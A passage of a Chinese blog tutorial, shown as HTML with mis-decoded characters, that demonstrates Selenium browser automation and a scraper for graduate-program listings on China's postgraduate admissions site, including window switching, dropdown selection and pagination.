class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¯¼å…¥ webdriver</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è°ƒç”¨é”®ç›˜æŒ‰é”®æ“ä½œæ—¶éœ€è¦å¼•å…¥çš„KeysåŒ…</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.keys <span class=\"keyword\">import</span> Keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è°ƒç”¨ç¯å¢ƒå˜é‡æŒ‡å®šçš„PhantomJSæµè§ˆå™¨åˆ›å»ºæµè§ˆå™¨å¯¹è±¡</span></span><br><span class=\"line\">driver = webdriver.PhantomJS()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å¦‚æœæ²¡æœ‰åœ¨ç¯å¢ƒå˜é‡æŒ‡å®šPhantomJSä½ç½®</span></span><br><span class=\"line\"><span class=\"comment\"># driver = webdriver.PhantomJS(executable_path=\"./phantomjs\"))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># getæ–¹æ³•ä¼šä¸€ç›´ç­‰åˆ°é¡µé¢è¢«å®Œå…¨åŠ è½½ï¼Œç„¶åæ‰ä¼šç»§ç»­ç¨‹åºï¼Œé€šå¸¸æµ‹è¯•ä¼šåœ¨è¿™é‡Œé€‰æ‹© time.sleep(2)</span></span><br><span class=\"line\">driver.get(<span class=\"string\">\"http://www.baidu.com/\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è·å–é¡µé¢åä¸º wrapperçš„idæ ‡ç­¾çš„æ–‡æœ¬å†…å®¹</span></span><br><span class=\"line\">data = driver.find_element_by_id(<span class=\"string\">\"wrapper\"</span>).text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ‰“å°é¡µé¢æ ‡é¢˜ \"ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> driver.title</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ç”Ÿæˆå½“å‰é¡µé¢å¿«ç…§å¹¶ä¿å­˜</span></span><br><span class=\"line\">driver.save_screenshot(<span class=\"string\">\"baidu.png\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># id=\"kw\"æ˜¯ç™¾åº¦æœç´¢è¾“å…¥æ¡†ï¼Œè¾“å…¥å­—ç¬¦ä¸²\"é•¿åŸ\"</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">\"kw\"</span>).send_keys(<span class=\"string\">u\"é•¿åŸ\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># id=\"su\"æ˜¯ç™¾åº¦æœç´¢æŒ‰é’®ï¼Œclick() æ˜¯æ¨¡æ‹Ÿç‚¹å‡»</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">\"su\"</span>).click()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ctrl+a å…¨é€‰è¾“å…¥æ¡†å†…å®¹</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">\"kw\"</span>).send_keys(Keys.CONTROL,<span class=\"string\">'a'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ctrl+x å‰ªåˆ‡è¾“å…¥æ¡†å†…å®¹</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">\"kw\"</span>).send_keys(Keys.CONTROL,<span class=\"string\">'x'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è·å–hrefå€¼</span></span><br><span class=\"line\">driver.find_element_by_xpath(<span class=\"string\">\"html/body/div/div[1]/div[2]/a[1]\"</span>).get_attribute(<span class=\"string\">'href'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ¨¡æ‹ŸEnterå›è½¦é”®ï¼Œæ›¿ä»£ç‚¹å‡»æ“ä½œ</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">\"su\"</span>).send_keys(Keys.RETURN)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># æ¸…é™¤è¾“å…¥æ¡†å†…å®¹</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">\"kw\"</span>).clear()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å…³é—­å½“å‰é¡µé¢ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªé¡µé¢ï¼Œä¼šå…³é—­æµè§ˆå™¨</span></span><br><span class=\"line\"><span class=\"comment\"># driver.close()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å…³é—­æµè§ˆå™¨</span></span><br><span class=\"line\">driver.quit()</span><br></pre></td></tr></table></figure>\n\n<p>ä½¿ç”¨JSå–å¾—æœ€å¤§å±å¹•</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># æ¥ä¸‹æ¥æ˜¯å…¨å±çš„å…³é”®ï¼Œç”¨jsè·å–é¡µé¢çš„å®½é«˜ï¼Œå¦‚æœæœ‰å…¶ä»–éœ€è¦ç”¨jsçš„éƒ¨åˆ†ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•</span></span><br><span class=\"line\">    width = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollWidth\"</span>)</span><br><span class=\"line\">    height = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollHeight\"</span>)</span><br><span class=\"line\">    print(width, height)</span><br><span class=\"line\">    <span class=\"comment\"># çª—å£æœ€å¤§åŒ–</span></span><br><span class=\"line\">    driver.set_window_size(width, height)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"åˆ‡æ¢é¡µé¢\"><a href=\"#åˆ‡æ¢é¡µé¢\" class=\"headerlink\" title=\"åˆ‡æ¢é¡µé¢\"></a>åˆ‡æ¢é¡µé¢</h3><p>å½“æœ‰è®¸å¤š Tab æ—¶æˆ‘ä»¬éœ€è¦åˆ¤æ–­æˆ‘ä»¬å½“å‰å¤„äºå“ªä¸ªé¡µé¢ï¼Œä½¿ç”¨ <code>window_handles</code> æ¥æ“ä½œ</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Store the ID of the original window</span></span><br><span class=\"line\">original_window = driver.current_window_handle</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\"># Check we don't have other windows open already</span></span><br><span class=\"line\">   <span class=\"keyword\">assert</span> len(driver.window_handles) == <span class=\"number\">1</span></span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"comment\"># Wait for the new window or tab</span></span><br><span class=\"line\">   wait.until(EC.number_of_windows_to_be(<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\"># Loop through until we find a new window handle</span></span><br><span class=\"line\">   <span class=\"keyword\">for</span> window_handle <span class=\"keyword\">in</span> driver.window_handles:</span><br><span class=\"line\">       <span class=\"keyword\">if</span> window_handle != original_window:</span><br><span class=\"line\">           driver.switch_to.window(window_handle)</span><br><span class=\"line\">           <span class=\"keyword\">break</span></span><br><span class=\"line\">           </span><br><span class=\"line\">   wait.until(EC.title_is(<span class=\"string\">\"title\"</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å¤é€‰æ¡†é€‰æ‹©\"><a href=\"#å¤é€‰æ¡†é€‰æ‹©\" class=\"headerlink\" title=\"å¤é€‰æ¡†é€‰æ‹©\"></a>å¤é€‰æ¡†é€‰æ‹©</h3><p>é€‰æ‹©ä¸€ä¸ªå®é™…åœºæ™¯è¿›è¡Œæµ‹è¯•ï¼Œ<a href=\"https://yz.chsi.com.cn/zsml/zyfx_search.jsp\" target=\"_blank\" rel=\"noopener\">ä»¥ç ”æ‹›ç½‘ç¡•å£«ä¸“ä¸šç›®å½•ä¸ºä¾‹</a> </p>\n<p><img src=\"F:%5Call_kinds_file%5C%E8%AF%BE%E8%AE%BE%5C%E5%A4%A7%E4%B8%89%E4%B8%8B%5C%E6%96%87%E6%A1%A3%E5%9B%BE%E7%89%87%5C%E7%A0%94%E6%8B%9B%E7%BD%91%E9%A6%96%E9%A1%B5.png\" alt=\"ç ”æ‹›ç½‘é¦–é¡µ\"></p>\n<p>è¿™æœ‰ä¸€ä¸ª <code>select</code> æ ‡ç­¾ä¸‹çš„å¤é€‰æ¡†ï¼Œç”¨å¸¸è§„çš„æ–¹æ³•è§£æ <code>Xpath</code> è·¯å¾„å¯ä»¥è·å–åˆ°æƒ³è¦çš„å…ƒç´ ï¼Œä½†æ˜¯æ²¡åŠæ³•è¿›è¡Œé€‰æ‹©ï¼Œè¿™é‡Œé‡‡ç”¨ <code>Selenium</code> æä¾›çš„ <code>Select</code> åº“è¿›è¡Œé€‰æ‹©ï¼Œ<a href=\"https://selenium-python-zh.readthedocs.io/en/latest/api.html\" target=\"_blank\" rel=\"noopener\">æ–‡æ¡£åœ¨è¿™é‡Œ</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ Select å¤„ç†ä¸‹æ‹‰æ¡†çš„é€‰é¡¹</span></span><br><span class=\"line\"><span class=\"comment\"># å…ˆé€šè¿‡ Xpath æ‰¾åˆ° select æ ‡ç­¾ï¼Œç„¶åé€šè¿‡ value æ‰¾åˆ°å¯¹åº”å€¼å³å¯é€‰æ‹©</span></span><br><span class=\"line\">Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='mldm']\"</span>)).select_by_value(<span class=\"string\">'zyxw'</span>)</span><br><span class=\"line\">Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='yjxkdm']\"</span>)).select_by_value(<span class=\"string\">\"0854\"</span>)</span><br></pre></td></tr></table></figure>\n\n<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸçš„é€‰æ‹©åˆ°æƒ³è¦çš„å…ƒç´ ï¼Œä¹‹åè¿›è¡ŒæŸ¥è¯¢è·³è½¬å³å¯ã€‚</p>\n<h2 id=\"çˆ¬è™«è®¾è®¡\"><a href=\"#çˆ¬è™«è®¾è®¡\" class=\"headerlink\" title=\"çˆ¬è™«è®¾è®¡\"></a>çˆ¬è™«è®¾è®¡</h2><p>æˆ‘ä»¬å°†æœ¬æ¬¡çˆ¬è™«åˆ†ä¸ºå‡ å¤§éƒ¨åˆ†</p>\n<ol>\n<li>é€»è¾‘åˆ†æ</li>\n<li>ä»£ç å®ç°</li>\n<li>æ•°æ®å¯è§†åŒ–</li>\n</ol>\n<h3 id=\"é€»è¾‘åˆ†æ\"><a href=\"#é€»è¾‘åˆ†æ\" class=\"headerlink\" title=\"é€»è¾‘åˆ†æ\"></a>é€»è¾‘åˆ†æ</h3><p>æ­¤æ¬¡çˆ¬è™«æˆ‘ä»¬çš„è®¾è®¡ç›®æ ‡æ˜¯çˆ¬å–ç ”æ‹›ç½‘2020å¹´çš„è€ƒç ”ç›¸å…³æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè®¤ä¸ºçš„å¯¹ç›®æ ‡ç½‘ç«™è¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼Œæ˜ç¡®æ“ä½œæµç¨‹ä¹‹åï¼Œå†è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</p>\n<ol>\n<li><strong>é€‰æ‹©æˆ‘ä»¬è¦ä½¿ç”¨çš„æµè§ˆå™¨</strong>ï¼Œè¿›å…¥æŸ¥è¯¢ç½‘å€ï¼Œ<a href=\"https://yz.chsi.com.cn/zsml/queryAction.do\" target=\"_blank\" rel=\"noopener\">ç ”æ‹›ç½‘ç¡•å£«ä¸“ä¸šç›®å½•æŸ¥è¯¢</a></li>\n<li>æ‰“å¼€ç ”æ‹›ç½‘çš„ç¡•å£«ç›®å½•åéœ€è¦å…ˆè‡³å°‘é€‰æ‹©ä¸¤é¡¹æ¡ä»¶ï¼Œä¸”å­¦ç§‘ç±»åˆ«ä¸ºå¿…é€‰é¡¹ï¼Œ<strong>é€‰æ‹©å¥½æ¡ä»¶</strong>ä¹‹åæ‰èƒ½è¿›è¡ŒæŸ¥è¯¢</li>\n</ol>\n<p><img src=\"F:%5Call_kinds_file%5C%E8%AF%BE%E8%AE%BE%5C%E5%A4%A7%E4%B8%89%E4%B8%8B%5C%E6%96%87%E6%A1%A3%E5%9B%BE%E7%89%87%5C%E7%A0%94%E6%8B%9B%E7%BD%91%E9%A6%96%E9%A1%B5.png\" alt=\"ç ”æ‹›ç½‘é¦–é¡µ\"></p>\n<ol start=\"2\">\n<li>æˆ‘ä»¬ä»¥ ä¸“ä¸šå­¦ä½ã€ç”µå­ä¿¡æ¯ ä¸ºç­›é€‰æ¡ä»¶ï¼Œé€‰æ‹©å¥½æ¡ä»¶åä¼š<strong>è¿›è¡Œä¸€æ¬¡é¡µé¢è·³è½¬</strong>ï¼Œè¿›å…¥åŒ…å«æ‰€æœ‰ç¬¦åˆæˆ‘ä»¬é€‰æ‹©æ¡ä»¶çš„é™¢æ ¡åˆ—è¡¨é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œç¬¦åˆæ¡ä»¶çš„é™¢æ ¡éå¸¸å¤šï¼Œæœ‰åå‡ é¡µçš„å†…å®¹ã€‚</li>\n<li>å¯¹äºè¿™äº›é™¢æ ¡ï¼Œæˆ‘ä»¬çš„å…³æ³¨ç‚¹å¯èƒ½åœ¨äºæ‰€åœ¨åŸå¸‚ï¼Œä»¥åŠæ‰€å¼€è®¾çš„ç ”ç©¶æ–¹å‘ç­‰ä¿¡æ¯ã€‚æˆ‘ä»¬é€‰æ‹©ä¸€æ‰€é™¢æ ¡è¿›è¡Œç‚¹å‡»ä¹‹åï¼Œ<strong>ä¼šæ‰“å¼€ä¸€ä¸ªæ–°çš„çª—å£</strong> ï¼Œé‡Œé¢åŒ…å«äº†è¯¥æ ¡åœ¨æœ¬å­¦ç§‘ç±»åˆ«ä¸‹å¼€è®¾çš„æ‰€æœ‰ç ”ç©¶æ–¹å‘ä¸è®¡åˆ’æ‹›æ”¶äººæ•°ç­‰ä¿¡æ¯ï¼Œæœ‰äº›å­¦æ ¡çš„ç ”ç©¶æ–¹å‘éå¸¸å¤šï¼Œå¯èƒ½ä¼šæœ‰åå‡ é¡µå†…å®¹ã€‚</li>\n<li>æŸ¥çœ‹å®Œä¸€ä¸ªå­¦æ ¡ï¼Œ<strong>è®°å½•æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯</strong>ä¹‹åï¼Œæˆ‘ä»¬å¯èƒ½ä¼šæŸ¥çœ‹å…¶ä»–å­¦æ ¡ã€‚äºæ˜¯ï¼Œä¸ºäº†é¿å…æ‰“å¼€çª—å£è¿‡å¤šï¼Œæˆ‘ä»¬ä¼š<strong>å…³é—­æ–°æ‰“å¼€çš„çª—å£</strong>ï¼Œå›åˆ°é™¢æ ¡åˆ—è¡¨é¡µé¢ï¼Œé‡æ–°æ‰“å¼€ä¸€ä¸ªå­¦æ ¡çš„ç ”ç©¶æ–¹å‘çª—å£ã€‚</li>\n<li>æŸ¥è¯¢å®Œæˆï¼Œ<strong>å…³é—­æµè§ˆå™¨</strong>ã€‚</li>\n</ol>\n<h3 id=\"ä»£ç å®ç°\"><a href=\"#ä»£ç å®ç°\" class=\"headerlink\" title=\"ä»£ç å®ç°\"></a>ä»£ç å®ç°</h3><p>é’ˆå¯¹ä¸Šæ–‡çš„é€»è¾‘åˆ†æï¼Œæˆ‘ä»¬ç¼–å†™ä»£ç æ—¶ä¹Ÿä¸»è¦å®Œæˆä¸Šè¿°åŠ¨ä½œã€‚</p>\n<ol>\n<li><p>é€‰æ‹©æµè§ˆå™¨ï¼Œå¹¶è¿›è¡Œé…ç½®</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># é…ç½® driver</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_driver</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    chrome_options = Options()</span><br><span class=\"line\">    chrome_options.add_argument(<span class=\"string\">\"--headless\"</span>) <span class=\"comment\"># å³æ‰€è°“ æ— å¤´ æ¨¡å¼</span></span><br><span class=\"line\">    chrome_options.add_argument(<span class=\"string\">\"--disable-gpu\"</span>)</span><br><span class=\"line\">    driver = webdriver.Chrome(executable_path=<span class=\"string\">\"E:/Program Files/chromedriver_win32/chromedriver.exe\"</span>,</span><br><span class=\"line\">                              chrome_options=chrome_options)</span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\">    driver = set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># å°†è®¾ç½®å±å¹•å¤§å°ç‹¬ç«‹å‡ºæ¥ï¼Œæ–¹ä¾¿æ¯æ¬¡è·³è½¬å®Œä½¿ç”¨</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_height_width</span><span class=\"params\">(driver)</span>:</span> </span><br><span class=\"line\">    width = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollWidth\"</span>)</span><br><span class=\"line\">    height = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollHeight\"</span>)</span><br><span class=\"line\">    driver.set_window_size(width, height) <span class=\"comment\"># å°†å±å¹•å¤§å°è®¾ç½®ä¸ºæœ€å¤§ï¼Œé˜²æ­¢éƒ¨åˆ†ä¿¡æ¯åŠ è½½ä¸å®Œå…¨</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> driver</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>æ¡ä»¶é€‰æ‹©ä¸é¡µé¢è·³è½¬</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># é€‰æ‹©ç›®æ ‡ä¸“ä¸š</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">select_major</span><span class=\"params\">(driver)</span>:</span></span><br><span class=\"line\">    original_window = driver.current_window_handle</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(driver.window_handles) == <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># https://selenium-python-zh.readthedocs.io/en/latest/api.html</span></span><br><span class=\"line\">        <span class=\"comment\"># ä½¿ç”¨ Select å¤„ç†ä¸‹æ‹‰æ¡†çš„é€‰é¡¹</span></span><br><span class=\"line\">        <span class=\"comment\"># å…ˆé€šè¿‡ Xpath æ‰¾åˆ° select æ ‡ç­¾ï¼Œç„¶åé€šè¿‡ value æ‰¾åˆ°å¯¹åº”å€¼å³å¯é€‰æ‹©</span></span><br><span class=\"line\">        Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='mldm']\"</span>)).select_by_value(<span class=\"string\">'zyxw'</span>) <span class=\"comment\"># é€‰æ‹©ä¸“ä¸šå­¦ä½</span></span><br><span class=\"line\">        Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='yjxkdm']\"</span>)).select_by_value(<span class=\"string\">\"0854\"</span>) <span class=\"comment\"># ç”µå­ä¿¡æ¯çš„ä¸“ä¸šä»£ç </span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(<span class=\"string\">\"wrong \"</span> + str(e))</span><br><span class=\"line\"></span><br><span class=\"line\">    driver.find_element_by_xpath(<span class=\"string\">\"//input[@name='button']\"</span>).click() <span class=\"comment\"># æ‰¾åˆ°æŸ¥è¯¢æŒ‰é’®è¿›è¡Œç‚¹å‡»</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ç­‰å¾…æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶</span></span><br><span class=\"line\">    <span class=\"comment\"># wait.until(EC.number_of_windows_to_be(2))</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"comment\"># åˆ¤æ–­å½“å‰é¡µé¢</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> window_handle <span class=\"keyword\">in</span> driver.window_handles:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> window_handle != original_window:</span><br><span class=\"line\">            driver.switch_to.window(window_handle)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"comment\"># æˆåŠŸè·³è½¬åˆ°ç›®æ ‡ç½‘é¡µ</span></span><br><span class=\"line\">    driver = set_height_width(driver)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> driver</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>é€‰å–è¯¥é¡µé¢ä¸Šçš„æ‰€æœ‰é™¢æ ¡</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è·å¾—å½“å‰æ¡ä»¶ä¸‹çš„æ‰€æœ‰é«˜æ ¡åç§°,è¿”å›åç§°åˆ—è¡¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_school_name</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        name_list = []</span><br><span class=\"line\">        major_numbers_list = []</span><br><span class=\"line\">        number_list = []</span><br><span class=\"line\">        original_window = driver.current_window_handle</span><br><span class=\"line\">        flag = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(numbers)+<span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    school_name = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[1]//form[1]//a[1]\"</span>.format(line)).get_attribute(<span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">                    print(school_name)</span><br><span class=\"line\">                    name_list.append(school_name)</span><br><span class=\"line\">                <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                    flag = <span class=\"literal\">False</span></span><br><span class=\"line\">                    print(<span class=\"string\">\"æŸ¥æ‰¾å¤±è´¥ï¼Œè¯·æ£€æŸ¥å½“å‰é¡µé¢æ˜¯å¦ä¸ºç©ºï¼\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> (pagenumber &lt; <span class=\"number\">7</span>):</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                numbers = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(numbers)+<span class=\"number\">1</span>):</span><br><span class=\"line\">                    school_name = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[1]//form[1]//a[1]\"</span>.format(line)).get_attribute(<span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">                    name_list.append(school_name)</span><br><span class=\"line\">                    print(school_name)</span><br><span class=\"line\"></span><br><span class=\"line\">                ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># print(name_list)</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> name_list, major_numbers_list, number_list, flag</span><br></pre></td></tr></table></figure>\n\n\n</li>\n</ol>\n<ol start=\"4\">\n<li><p>ç¿»é¡µå¤„ç†</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># å¦‚æœéœ€è¦ç¿»é¡µå°±ç¿»é¡µ</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">paging</span><span class=\"params\">(driver)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    css_selector_pages = <span class=\"string\">\"body.ch-sticky:nth-child(2) \"</span> \\</span><br><span class=\"line\">                         <span class=\"string\">\"div.main-wrapper:nth-child(2) \"</span> \\</span><br><span class=\"line\">                         <span class=\"string\">\"div.container.clearfix:nth-child(5) \"</span> \\</span><br><span class=\"line\">                         <span class=\"string\">\"div.zsml-row.clearfix div.zsml-page-box &gt; ul.ch-page\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    ul = driver.find_element_by_css_selector(css_selector_pages)</span><br><span class=\"line\">    li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>) </span><br><span class=\"line\">    